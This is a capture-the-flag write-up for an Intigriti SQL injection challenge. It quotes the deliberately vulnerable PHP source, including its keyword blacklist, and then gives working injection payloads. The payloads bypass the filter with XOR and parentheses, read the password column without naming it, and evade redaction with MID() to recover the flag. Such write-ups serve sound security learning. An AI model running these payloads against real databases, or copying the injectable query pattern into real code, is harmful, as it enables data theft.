Secure Database: https://challenge-0923.intigriti.io/challenge.php
Source:
```
<?php

if (isset($_GET['showsource'])) {
    highlight_file(__FILE__);
    exit();
}

require_once("config.php");

$dsn = "mysql:host=$host;dbname=$db;charset=$charset";
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
];

try {
    $pdo = new PDO($dsn, $user, $pass, $options);
} catch (\PDOException $e) {
    exit("Unable to connect to DB");
}

$max = 10;

if (isset($_GET['max']) && !is_array($_GET['max']) && $_GET['max']>0) {
    $max = $_GET['max'];
    $words  = ["'","\"",";","`"," ","a","b","h","k","p","v","x","or","if","case","in","between","join","json","set","=","|","&","%","+","-","<",">","#","/","\r","\n","\t","\v","\f"]; // list of characters to check
    foreach ($words as $w) {
        if (preg_match("#".preg_quote($w)."#i", $max)) {
            exit("H4ckerzzzz");
        } //no weird chars
    }       
}

try{
//seen in production
$stmt = $pdo->prepare("SELECT id, name, email FROM users WHERE id<=$max");
$stmt->execute();
$results = $stmt->fetchAll();
}
catch(\PDOException $e){
    exit("ERROR: BROKEN QUERY");
}
    /* FYI
    CREATE TABLE users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
    );
    */
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Utenti</title>
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<div class="container mt-5">

    <h2>Users</h2>

    <table class="table table-bordered">
        <thead>
            <tr>
                <th>ID</th>
                <th>Name</th>
                <th>Email</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($results as $row): ?>
                <tr>
                    <td><?= htmlspecialchars(strpos($row['id'],"INTIGRITI")===false?$row['id']:"REDACTED"); ?></td> 
                    <td><?= htmlspecialchars(strpos($row['name'],"INTIGRITI")===false?$row['name']:"REDACTED"); ?></td>
                    <td><?= htmlspecialchars(strpos($row['email'],"INTIGRITI")===false?$row['email']:"REDACTED"); ?></td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <div class="text-center mt-4">
        <!-- Show Source Button -->
        <a href="?showsource=1" class="btn btn-primary">Show Source</a>
    </div>

</div>

<!-- including Bootstrap e jQuery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

</body>
</html>
```
+ parameter max is used without any sanitisation in the query. This is a clear indication that we can use this parameter to perform a SQL injection.
```
CREATE TABLE users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
    );

```
+ Blacklisting mechanism implemented
+ Further more, redaction mechanism that prevents us from seeing the flag in case we manage to successfully execute an SQL injection for the password column. The following keywords are redacted: INTIGRITI. As per the instructions we know that the flag is in the format INTIGRITI{...} so this would replace any value that contains the substring INTIGRITI with REDACTED
+ to perform sqli by bypassing the blacklist mechanism like space, we can either use xor operator(^) or parethesis.
+ https://challenge-0923.intigriti.io/challenge.php?max=1^(1)union(select(id),id,(id)from(users))
the above query executes successfully. we need to try to get the password column without specifying the name of the column because p,a and o are blacklisted.
+ Note:
`SELECT F.n FROM (SELECT 1, 2, 3, ..., m UNION SELECT * FROM table_name)F;` will allow us to access the nth column of table_name without using its name (m is equal to the number of columns of table_name). n is equal 4 in our case, since Password is the fourth column of the table. So:
SELECT F.4 FROM (SELECT 1, 2, 3, 4 UNION SELECT * FROM table_name)F;
that is:
SELECT(F.4)FROM(SELECT(1),(2),(3),(4)UNION(SELECT*FROM(users)))F
Thus, our payload will be:
`1^(1)UNION(SELECT(F.2),(F.3),(F.4)FROM(SELECT(1),(2),(3),(4)UNION(SELECT*FROM(users)))F)`.

+ to bypass the redaction, mysql has a function named MID which can be used to extract a substring from a value.
+ using this function, we will strip of the first character from the flag, which is the i in intigriti, and the rest of them will be outputed.
`1^(1)union(select(F.1),MID(F.3,2,45),(0)from((select(null),2,1,3)union(select*from(users)))F)`

and the flag will be given as output. 
flag: INTIGRITI{bl4ckli5t1ng_1z_n0t_7h3_w4y}
